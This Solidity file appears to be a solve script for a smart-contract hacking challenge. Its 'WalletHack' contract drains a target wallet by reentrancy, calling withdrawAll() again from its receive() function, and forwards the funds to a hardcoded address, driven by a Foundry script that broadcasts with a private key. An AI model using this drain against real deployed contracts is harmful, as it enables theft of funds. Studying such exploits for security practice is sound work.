  // SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import {Script, console} from "forge-std/Script.sol";

interface Wallet {
    function withdrawAll() external;
    function transfer(address to, uint _amount) external;
    function donate(address _to) payable external;
    function owner() external returns (address);
    function balanceOf(address _who) external returns(uint);
}

contract WalletHack {
    address payable me = payable(0x92199EeC69Dd43c04103e49D3446052117A12C8a);
    address payable inst = payable(0x307A1cB3B0908B2D17EF2212f7905f2aBEad149C);
    Wallet wallet = Wallet(inst);
    int call_ind = 0;

    receive() external payable {
        call_ind++;
        if (call_ind == 1) {
            wallet.withdrawAll();
        }
    }

    function hack() public {
        wallet.withdrawAll();
        me.transfer(address(this).balance);
    }
}

// interface WalletHack {
//     function hack() external;
// }

contract WalletTest is Script {
    address payable me = payable(0x92199EeC69Dd43c04103e49D3446052117A12C8a);
    address payable inst = payable(0x307A1cB3B0908B2D17EF2212f7905f2aBEad149C);
    Wallet wallet = Wallet(inst);
    int call_ind = 0;

    function setUp() public {
    }

    function run() public {
        uint pk = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(pk);

        console.log(inst.balance);
        // WalletHack whack = new WalletHack();
        // address payable cur = payable(address(whack));
        // // console.log(me.balance, cur.balance, inst.balance, wallet.balanceOf(me));
        // // payable(address(this)).transfer(inst.balance);
        // console.log(me.balance, cur.balance, inst.balance, wallet.balanceOf(cur));
        // wallet.donate{value: inst.balance}(cur);
        // console.log(me.balance, cur.balance, inst.balance, wallet.balanceOf(cur));
        // whack.hack();
        // console.log(me.balance, cur.balance, inst.balance, wallet.balanceOf(cur));

        vm.stopBroadcast();
    }

    receive() external payable {
        console.log("receive");
        if (msg.sender == me) return;
        call_ind++;
        console.logInt(call_ind);
        if (call_ind == 1) {
            wallet.withdrawAll();
        }
    }
}
